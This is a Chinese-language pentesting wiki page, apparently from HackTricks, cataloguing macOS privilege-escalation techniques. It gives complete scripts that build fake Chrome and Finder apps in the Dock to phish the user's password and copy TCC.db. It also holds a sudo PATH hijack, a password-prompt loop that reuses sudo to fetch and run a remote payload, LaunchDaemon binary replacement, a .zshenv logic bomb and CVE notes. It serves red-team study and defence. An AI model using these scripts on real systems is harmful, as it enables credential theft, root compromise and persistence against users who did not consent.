# macOS 权限提升

{{#include ../../banners/hacktricks-training.md}}

## TCC 权限提升

如果你来这里是为了查找 TCC 权限提升，请前往：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

许多影响 Linux 或其他类 Unix 系统的权限提升技术同样适用于 macOS。请参阅：


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## 用户交互

### Sudo Hijacking

你可以在 [Linux Privilege Escalation 帖子中找到原始的 Sudo Hijacking 技术](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)。

但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是 **hijack** 受害者在**运行 sudo 时**仍会执行的其他二进制文件：
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
注意，使用 terminal 的用户极有可能已经**安装了 Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。

### Dock 伪装

通过一些**社会工程**，你可以在 Dock 中**伪装成例如 Google Chrome**，并实际执行自己的脚本：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
一些建议：

- 检查 Dock 中是否有 Chrome；如果有，**移除**该条目，并将**伪造的** **Chrome 条目添加到 Dock 数组中的相同位置**。

<details>
<summary>Chrome Dock 伪装脚本</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
一些建议：

- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以把伪造的 Finder 放在真实 Finder 的旁边。为此，你需要**将伪造的 Finder 条目添加到 Dock 数组的开头**。
- 另一种选择是不将其放入 Dock，而是直接打开它；“Finder 请求控制 Finder”并不奇怪。
- 另一种**无需询问密码即可提升到 root**、避免出现令人不适的对话框的方法，是让 Finder 真正请求密码来执行特权操作：
- 让 Finder 将一个新的 **`sudo` 文件复制到 `/etc/pam.d`**（密码提示会显示“Finder 想要复制 sudo”）
- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，这样密码提示会显示“Finder 想要复制 Finder.bundle”）

<details>
<summary>Finder Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware 经常滥用用户交互来**捕获具备 sudo 权限的密码**，并通过程序重复使用该密码。常见流程如下：

1. 使用 `whoami` 识别已登录用户。
2. **循环显示密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
3. 缓存凭据（例如 `/tmp/.pass`），并通过 `sudo -S` 驱动特权操作（密码通过标准输入传递）。

最简示例链：
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
窃取的密码随后可被重新用于**通过 `xattr -c` 清除 Gatekeeper quarantine**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行额外阶段。<sup>[[1]](#references)</sup>

## Newer macOS-specific vectors (2023–2026)

### Deprecated `AuthorizationExecuteWithPrivileges` still usable

`AuthorizationExecuteWithPrivileges` 在 10.7 中已被弃用，但**在 Sonoma/Sequoia 上仍然可用**。许多商业更新程序会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标二进制文件可由用户写入，你就可以植入 trojan，并利用合法的提示执行：
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
结合上面的 **masquerading tricks**，呈现一个可信的密码对话框。


### Privileged helper / XPC triage

许多现代第三方 macOS privescs 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，然后该 helper 要么**不验证客户端**，要么验证得**太晚**（PID race），要么暴露一个会处理**用户控制的路径/脚本**的 **root method**。这类 bug 导致了 VPN 客户端、游戏启动器和 updater 中近期出现的许多 helper 漏洞。<sup>[[2]](#references)</sup>

快速 triage 检查清单：
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
特别注意以下 helpers：

- 在 **卸载后** 仍继续接受请求，因为该 job 仍加载在 `launchd` 中
- 从 **`/Applications/...`** 或其他非 root 用户可写的路径执行 scripts 或读取 configuration
- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer validation，而这些验证可能存在 race condition

有关 helper authorization bugs 的更多详情，请查看[此页面](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。

### PackageKit script environment inheritance (CVE-2024-27822)

在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复该问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的 environment 中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 **root** 身份运行它。<sup>[[3]](#references)</sup>

这作为 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的、基于 **zsh** 的 installer。该问题通常不适用于 **MDM/Munki** deployments，因为它们在 root 用户的 environment 中运行。<sup>[[3]](#references)</sup>
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
如果想更深入了解特定于 installer 的滥用方式，也请查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。

### 通过 `.localized` 实现 installer 目标位置冲突

某些第三方 installer 会注册一个 root LaunchDaemon，其可执行文件通过 `/Applications/Target.app` 内的固定路径引用。如果攻击者能够先创建该 bundle，并使用**不同的 bundle identifier**，Installer 可能会保留这个诱饵 bundle，并将真实应用放置在 `/Applications/Target.localized/Target.app`。该 daemon 仍然指向原始路径。因此，诱饵 bundle 中由攻击者控制的可执行文件之后可以以 root 身份运行。<sup>[[8]](#references)</sup>

重要的前置条件包括：<sup>[[8]](#references)</sup>

1. 攻击者能够创建或控制预期的应用路径。
2. package 不会删除冲突的 bundle。
3. 特权 job 使用该 bundle 内的硬编码路径。
4. 用户或 MDM workflow 安装 package 并注册该 job。

查找被重新定位的 bundle，然后使用下一节中的 enumeration loop 检查 LaunchDaemon targets：<sup>[[8]](#references)</sup>
```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```
更安全的 installer 会解析最终 bundle 位置，并将特权 executables 保存在 root-owned 位置，例如 `/Library/PrivilegedHelperTools`。在注册或启动 job 之前，还应验证 ownership 和 code signing。<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist 可能由 root-owned，但其 `Program` 或第一个 `ProgramArguments` 条目却指向 user-writable directory。检查**整个路径**，而不只是 executable mode。如果父目录可写，attacker 可能重命名 root-owned executable，并在同一路径创建 replacement。下次 job 启动时，replacement 将以 root 身份运行。重启或正常的 service restart 即可触发。attacker 不需要权限在 system domain 中运行 `launchctl bootstrap`。<sup>[[7]](#references)</sup>

首先枚举每个 target 及其直接父目录：<sup>[[7]](#references)</sup>
```bash
for p in /Library/LaunchDaemons/*.plist; do
target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
[ -n "$target" ] ||
target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
[ -n "$target" ] || continue
printf '\n%s -> %s\n' "$p" "$target"
ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```
当文件或其父目录可写时，保留原始 binary，并将该路径替换为可执行 payload。然后等待已加载的 daemon 重启。<sup>[[7]](#references)</sup>
```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```
### XNU SMR credential-pointer race (CVE-2025-24118)

易受攻击的 `kauth_cred_proc_update` 路径使用非原子的 `zalloc_ro_mut` API 更新 `proc_ro.p_ucred`，而 SMR readers 在未加锁的情况下加载该指针。公开的触发方式使用经过特殊准备的 setgid binary。一个线程在其 real 和 effective group IDs 之间切换，而另一个线程则反复进入诸如 `getgid()` 之类的 syscall。<sup>[[4]](#references)</sup>
```c
// Writer thread inside a setgid binary
while (1) {
setgid(real_gid);
setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```
将其视为一种 **race primitive**，而不是现成的 root exploit。公开的 PoC 展示了 credential pointer 被撕裂的情况，通常会以 kernel panic 结束。研究人员仅在 Intel 上复现了该 corruption，并未实现对生成的 credential object 的确定性控制。Apple 在 macOS 15.3 中将该更新改为 atomic pointer exchange。<sup>[[4]](#references)</sup>

### 通过 Migration Assistant 绕过 SIP（“Migraine”，CVE-2023-32369）

即使你已经拥有 root，SIP 仍会阻止对系统位置的写入。**Migraine** bug 滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的 child process，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。<sup>[[5]](#references)</sup>攻击链如下：

1. 在运行中的系统上获取 root。
2. 使用 crafted state 触发 `systemmigrationd`，使其运行 attacker-controlled binary。
3. 使用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍能保持 persistence。

### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）

多个 Apple daemons 通过 XPC 接受 **NSPredicate** objects，却只验证由 attacker 控制的 `expressionType` field。通过构造一个可计算任意 selectors 的 predicate，你可以在 **root/system XPC services**（例如 `coreduetd`、`contextstored`）中实现 **code execution**。如果与 initial app sandbox escape 结合，还能在**无需用户提示**的情况下实现 **privilege escalation**。寻找会 deserialize predicates 且缺少 robust visitor 的 XPC endpoints。<sup>[[6]](#references)</sup>

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass 和 privilege escalation

**任何用户**（即使是 unprivileged user）都可以使用 `-o noowners` 创建并挂载 Time Machine snapshot，随后**访问该 snapshot 中的所有文件**，从而绕过 live volume 上的 ownership checks。唯一需要的 privilege 是所使用的 application（例如 `Terminal`）具有 **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）。

commands 和完整说明位于 TCC bypasses 页面：

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## 敏感信息

以下内容可能有助于进行 privilege escalation：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025 年，Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165：适用于 macOS 的 AWS Client VPN Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE：CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft “Migraine” SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS 和 iOS 上的一类新型 Privilege Escalation Bug（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon Hijacking：通过不安全的文件夹权限实现 privilege escalation 和 persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [通过 .localized 目录实现 macOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
